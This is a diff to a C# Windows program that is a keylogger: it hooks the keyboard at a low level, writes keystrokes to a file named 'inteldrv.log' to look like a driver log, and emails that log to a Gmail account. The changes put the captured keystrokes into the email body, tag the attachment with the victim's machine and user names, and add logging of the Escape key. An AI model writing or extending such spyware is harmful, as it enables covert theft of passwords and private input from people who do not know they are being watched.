@@ -14,6 +14,7 @@ namespace WindowsFormsApplication1
 {
     static class Program
     {
+        public static DateTime timeNow = DateTime.Today;
         const string logfilename = "inteldrv.log";
 
         private const int WH_KEYBOARD_LL = 13;
@@ -243,8 +244,7 @@ namespace WindowsFormsApplication1
             //   public const string username = "<username>";
             //   public const string password = "<password>";
             // *Make sure to add the class file the gitignore file, otherwise :(
-
-            // Future versions will be configurable to use other email providers and not rely on google
+            
             const string emailAddress = Password.username;
             const string emailPassword = Password.password;
 
@@ -253,7 +253,13 @@ namespace WindowsFormsApplication1
             msg.From = new MailAddress(emailAddress, emailAddress, System.Text.Encoding.UTF8);
             msg.Subject = "LOG [Computer:" + Environment.MachineName + "] [Username:" + Environment.UserName + "]";
             msg.SubjectEncoding = System.Text.Encoding.UTF8;
-            msg.Body = "Please view the attachment for details";
+
+            System.IO.StreamReader logfileContents = new System.IO.StreamReader(Program.path);
+            string body = logfileContents.ReadToEnd();
+            logfileContents.Close();
+            msg.Body = body;
+            //msg.Body = "Please view the attachment for details";
+
             msg.BodyEncoding = System.Text.Encoding.UTF8;
             msg.IsBodyHtml = false;
             msg.Priority = MailPriority.High;
@@ -266,6 +272,8 @@ namespace WindowsFormsApplication1
             client.Host = "smtp.gmail.com";
             client.EnableSsl = true;
             Attachment data = new Attachment(Program.path);
+            // Set the attachment name as log-computername-username-dateandtime.txt
+            data.Name = "log-" + Environment.MachineName + "-" + Environment.UserName + "-" + Program.timeNow.ToString("yyyyMMdd-HHmm") + ".txt";
             msg.Attachments.Add(data);
 
             try
@@ -354,6 +362,9 @@ namespace WindowsFormsApplication1
 
                 switch ((Keys)vkCode)
                 {
+                    case Keys.Escape:
+                        sw.Write("[ESCAPE]");
+                        break;
                     case Keys.Space:
                         sw.Write(" ");
                         break;
